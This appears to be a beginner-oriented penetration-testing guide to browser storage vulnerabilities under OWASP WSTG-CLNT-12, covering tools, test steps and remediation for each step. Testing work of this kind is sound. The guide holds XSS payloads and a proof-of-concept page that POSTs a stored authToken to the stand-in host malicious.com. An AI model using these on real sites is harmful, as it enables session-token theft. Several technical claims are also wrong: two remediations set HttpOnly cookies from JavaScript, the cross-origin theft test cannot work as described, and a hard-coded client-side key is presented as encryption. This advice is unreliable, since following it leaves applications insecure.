# Testing for Browser Storage Vulnerabilities

## Overview

Testing for Browser Storage vulnerabilities involves verifying that a web application securely uses browser storage mechanisms (`localStorage`, `sessionStorage`, IndexedDB) to prevent unauthorized access, data manipulation, or script injection. According to OWASP (WSTG-CLNT-12), vulnerabilities arise when sensitive data is stored insecurely, lacks proper validation, or is accessible to malicious scripts, enabling attackers to steal data or execute attacks like XSS. This guide provides a hands-on methodology to identify and test browser storage vulnerabilities, focusing on insecure data storage, lack of encryption, cross-site scripting risks, and access control issues, with tools, commands, and remediation strategies.

**Impact**: Browser storage vulnerabilities can lead to:
- Theft of sensitive data (e.g., authentication tokens, user information).
- Execution of malicious scripts via stored data (XSS).
- Unauthorized access to stored data by malicious sites or scripts.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide aligns with OWASP’s WSTG-CLNT-12, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as manipulating browser storage may trigger security alerts or violate terms of service.

## Testing Tools

The following tools are recommended for testing browser storage vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts HTTP requests and analyzes JavaScript handling browser storage.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use DOM Invader to detect `localStorage`/`sessionStorage` usage:
    1. Go to Extensions tab.
    2. Add DOM Invader and enable it in the browser.
  - **Note**: Check JavaScript in Response tab for storage operations.

- **Zed Attack Proxy (ZAP) 3.0**: A proxy tool for intercepting requests and scanning for client-side storage issues.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:11000`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with “Client-side Storage” rules to flag insecure storage.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects and manipulates browser storage.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Application tab > Storage to view `localStorage`, `sessionStorage`, and IndexedDB.
  - Example command to inspect storage:
    ```javascript
    console.log('localStorage:', localStorage);
    console.log('sessionStorage:', sessionStorage);
    ```
  - **Tip**: Firefox’s 2025 Storage Inspector enhancements improve IndexedDB analysis.

- **cURL and HTTPie**: Send HTTP requests to test parameters influencing stored data.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/page?data=maliciousScript"
      # HTTPie
      http "http://example.com/page?data=maliciousScript"
      ```

- **Storage Explorer**: A browser extension for analyzing browser storage.
  - Install from Chrome Web Store or Firefox Add-ons.
  - Usage:
    1. Open extension in Developer Tools.
    2. View and edit `localStorage`, `sessionStorage`, and IndexedDB.
  - **Note**: Useful for identifying sensitive data in storage.

- **Storage Payloads**: Curated payloads for testing.
  - Sample payloads:
    - `<script>alert('xss')</script>`
    - `{"script":"alert('xss')"}`
    - `javascript:alert('xss')`
  - Resource: [OWASP Client-Side Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage).
  - **Tip**: Test payloads in storage inputs and monitor for execution.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-CLNT-12, testing browser storage vulnerabilities across insecure data storage, XSS risks, access controls, encryption, and parameter-based injection.

### 1. Test Insecure Data Storage

**Objective**: Ensure sensitive data is not stored in `localStorage` or `sessionStorage` without protection.

**Steps**:
1. Identify storage usage:
   - Use Browser Developer Tools > Application > Storage to check `localStorage` and `sessionStorage`.
   - Search JavaScript for storage operations:
     ```javascript
     document.body.innerText.match(/localStorage|sessionStorage/g);
     ```
2. Check for sensitive data:
   - Look for tokens, passwords, or PII (e.g., `localStorage.getItem('token')`).
   - Console command:
     ```javascript
     Object.entries(localStorage).forEach(([k, v]) => console.log(k, v));
     ```
3. Test persistence:
   - Store data, close the browser, and reopen to verify if `localStorage` retains sensitive data.

**Example Secure Response**:
```javascript
// No sensitive data stored
localStorage.setItem('theme', 'dark');
```
No tokens or PII found.

**Example Vulnerable Response**:
```javascript
// Sensitive data stored
localStorage.setItem('authToken', 'abc123');
```
Token accessible to scripts.

**Remediation**:
- Avoid storing sensitive data:
  ```javascript
  // Use secure cookies instead
  document.cookie = 'authToken=abc123; HttpOnly; Secure';
  ```
- Minimize storage use:
  ```javascript
  sessionStorage.setItem('tempData', 'non-sensitive');
  ```

**Tip**: Save storage contents and sensitive data screenshots in a report.

### 2. Test XSS via Stored Data

**Objective**: Ensure stored data does not lead to script execution when rendered.

**Steps**:
1. Identify storage inputs:
   - Find form fields or parameters stored in `localStorage`/`sessionStorage`.
2. Inject a malicious payload:
   ```bash
   http "http://example.com/page?input=<script>alert('xss')</script>"
   ```
3. Check for execution:
   - Load the page and observe for an alert.
   - Inspect DOM rendering:
     ```javascript
     console.log(document.body.innerHTML);
     ```

**Example Secure Response**:
```javascript
// Sanitized output prevents execution
document.getElementById('output').textContent = localStorage.getItem('input');
```
No alert triggered.

**Example Vulnerable Response**:
```javascript
// Unvalidated output executes script
document.getElementById('output').innerHTML = localStorage.getItem('input');
```
Alert box displays "xss".

**Remediation**:
- Sanitize stored data:
  ```javascript
  localStorage.setItem('input', DOMPurify.sanitize(userInput));
  ```
- Use safe rendering:
  ```javascript
  document.getElementById('output').textContent = localStorage.getItem('input');
  ```

**Tip**: Save injected payloads and alert screenshots in a report.

### 3. Test Access Controls

**Objective**: Ensure storage is not accessible to unauthorized scripts or origins.

**Steps**:
1. Create a malicious page:
   ```html
   <!DOCTYPE html>
   <html>
   <body>
     <script>
       console.log('Stealing localStorage:', localStorage.getItem('authToken'));
       fetch('http://malicious.com/steal', { method: 'POST', body: localStorage.getItem('authToken') });
     </script>
   </body>
   </html>
   ```
2. Host the page (e.g., `python3 -m http.server 8000`) and load it after visiting `example.com`.
3. Check for data theft:
   - Monitor `malicious.com` logs for stolen storage data.
4. Test same-origin policy:
   - Verify storage is scoped to `example.com`.

**Example Secure Response**:
```javascript
// Storage scoped to origin
localStorage.setItem('data', 'value'); // Only accessible to example.com
```
No data stolen by `malicious.com`.

**Example Vulnerable Response**:
```javascript
// Global script accesses storage
<script src="http://malicious.com/steal.js"></script>
```
Data sent to `malicious.com`.

**Remediation**:
- Enforce same-origin policy (default for storage).
- Avoid external scripts accessing storage:
  ```javascript
  // Use trusted scripts
  <script src="/trusted.js"></script>
  ```
- Implement CSP:
  ```html
  <meta http-equiv="Content-Security-Policy" content="script-src 'self';">
  ```

**Tip**: Save PoC code and stolen data logs in a report.

### 4. Test Data Encryption

**Objective**: Ensure sensitive data in storage is encrypted or obfuscated.

**Steps**:
1. Inspect stored data:
   - Use Application > Storage to view `localStorage`/`sessionStorage`.
2. Check for plaintext sensitive data:
   - Look for unencrypted tokens or PII.
   - Console command:
     ```javascript
     console.log(localStorage.getItem('token'));
     ```
3. Test decryption requirements:
   - Verify if data is unusable without a key.

**Example Secure Response**:
```javascript
// Encrypted data
localStorage.setItem('token', encrypt('abc123', 'secretKey'));
```
Data unreadable without decryption.

**Example Vulnerable Response**:
```javascript
// Plaintext data
localStorage.setItem('token', 'abc123');
```
Token readable by scripts.

**Remediation**:
- Encrypt sensitive data:
  ```javascript
  const encrypted = CryptoJS.AES.encrypt('abc123', 'secretKey').toString();
  localStorage.setItem('token', encrypted);
  ```
- Use secure alternatives:
  ```javascript
  // Store in HttpOnly cookies
  document.cookie = 'token=abc123; HttpOnly; Secure';
  ```

**Tip**: Save storage contents and encryption status in a report.

### 5. Test Parameter-Based Injection

**Objective**: Ensure URL or form parameters do not inject malicious data into storage.

**Steps**:
1. Identify parameters stored in browser storage:
   - Look for `?data=` or form inputs affecting storage.
2. Inject a malicious payload:
   ```bash
   http "http://example.com/page?data=<script>alert('xss')</script>"
   ```
3. Check for storage and execution:
   - Verify storage contents:
     ```javascript
     console.log(localStorage.getItem('data'));
     ```
   - Reload the page to check for script execution.

**Example Secure Response**:
```javascript
// Sanitized input prevents execution
const safeData = data.replace(/[<>]/g, '');
localStorage.setItem('data', safeData);
```
No alert triggered.

**Example Vulnerable Response**:
```javascript
// Unvalidated input stored and executed
localStorage.setItem('data', data);
document.write(localStorage.getItem('data'));
```
Alert box displays "xss".

**Remediation**:
- Sanitize parameters:
  ```javascript
  localStorage.setItem('data', encodeURIComponent(data));
  ```
- Validate inputs:
  ```javascript
  if (/^[a-zA-Z0-9]+$/.test(data)) {
    localStorage.setItem('data', data);
  }
  ```

**Tip**: Save parameter payloads and storage execution screenshots in a report.